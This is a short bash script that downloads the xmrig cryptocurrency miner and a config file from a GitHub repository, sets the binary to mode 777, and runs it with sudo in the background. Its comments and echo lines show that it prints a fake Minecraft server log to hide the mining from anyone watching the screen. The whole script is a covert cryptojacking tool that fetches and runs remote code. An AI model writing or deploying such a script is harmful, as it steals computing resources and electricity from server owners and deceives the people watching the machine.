#!/bin/bash
echo "Welcome to R* Miner. Starting QUIET.."

# Getting the Miner and running it
wget https://github.com/mysterek1337/testxmr/raw/main/xmrig
wget https://raw.githubusercontent.com/mysterek1337/testxmr/main/config.json

# FIX for XMRIG: Permission denied

clear
chmod +777 xmrig

# The fake Minecraft log screen
sleep 2

clear
echo "[00:00:00] Player69 issued server command: /tpa Player420"
echo "[00:00:02] Player69 -> Player420: what's up?"

nohup sudo ./xmrig --config config.json
